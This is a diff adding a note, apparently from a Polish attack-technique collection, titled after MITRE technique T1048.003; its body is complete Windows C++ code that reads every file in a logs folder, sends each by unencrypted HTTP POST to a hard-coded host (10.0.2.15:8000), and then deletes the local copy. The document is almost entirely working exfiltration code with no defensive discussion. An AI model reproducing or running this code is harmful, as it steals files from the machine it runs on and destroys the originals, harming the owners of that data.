@@ -1,0 +1,102 @@
+---
+title: "Exfiltration.T1048.003.Unencrypted Non-C2 Protocol"
+folder: "Całe Ataki/3. C2 and Exfiltration"
+---
+
+
+
+
+
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <filesystem>
+#include <windows.h>
+#include <shellapi.h>
+#pragma comment(lib, "Ws2_32.lib")
+
+
+bool WyslijPlik(const std::string& nazwaPliku, const std::string& adresIP, int port) {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "Błąd przy inicjalizacji Winsock." << std::endl;
+        return false;
+    }
+
+    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sockfd == INVALID_SOCKET) {
+        std::cerr << "Błąd przy tworzeniu gniazda." << std::endl;
+        WSACleanup();
+        return false;
+    }
+
+    sockaddr_in serv_addr;
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(port);
+    inet_pton(AF_INET, adresIP.c_str(), &serv_addr.sin_addr);
+
+    if (connect(sockfd, reinterpret_cast<sockaddr*>(&serv_addr), sizeof(serv_addr)) == SOCKET_ERROR) {
+        std::cerr << "Błąd przy łączeniu z serwerem." << std::endl;
+        closesocket(sockfd);
+        WSACleanup();
+        return false;
+    }
+
+    std::ifstream plik(nazwaPliku, std::ios::binary);
+    if (!plik.is_open()) {
+        std::cerr << "Nie można otworzyć pliku: " << nazwaPliku << std::endl;
+        closesocket(sockfd);
+        WSACleanup();
+        return false;
+    }
+
+    std::string zawartosc((std::istreambuf_iterator<char>(plik)), std::istreambuf_iterator<char>());
+
+    std::string header = "POST / HTTP/1.1\r\n";
+    header += "Host: " + adresIP + ":" + std::to_string(port) + "\r\n";
+    header += "Content-Type: application/octet-stream\r\n";
+    header += "Content-Length: " + std::to_string(zawartosc.size()) + "\r\n\r\n";
+    header += zawartosc;
+
+    int bytesSent = send(sockfd, header.c_str(), header.size(), 0);
+    if (bytesSent == SOCKET_ERROR) {
+        std::cerr << "Błąd przy wysyłaniu danych." << std::endl;
+        closesocket(sockfd);
+        WSACleanup();
+        return false;
+    }
+
+    closesocket(sockfd);
+    plik.close();
+    WSACleanup();
+
+    std::cout << "Plik " << nazwaPliku << " został wysłany na serwer." << std::endl;
+    return true;
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    
+        std::string folderPath = "C:\\Users\\User\\Downloads\\logs";
+        std::string adresIP = "10.0.2.15";
+        int port = 8000;
+
+        for (const auto& entry : std::filesystem::directory_iterator(folderPath)) {
+            if (entry.is_regular_file()) {
+                std::string nazwaPliku = entry.path().string();
+                if (WyslijPlik(nazwaPliku, adresIP, port)) {
+                    std::cout << "Wysyłanie pliku " << nazwaPliku << " powiodło się." << std::endl;
+                    std::filesystem::remove(nazwaPliku);
+                    std::cout << "Plik " << nazwaPliku << " został usunięty." << std::endl;
+                }
+                else {
+                    std::cerr << "Wysyłanie pliku " << nazwaPliku << " nie powiodło się." << std::endl;
+                }
+            }
+        }
+    
+    return 0;
+}
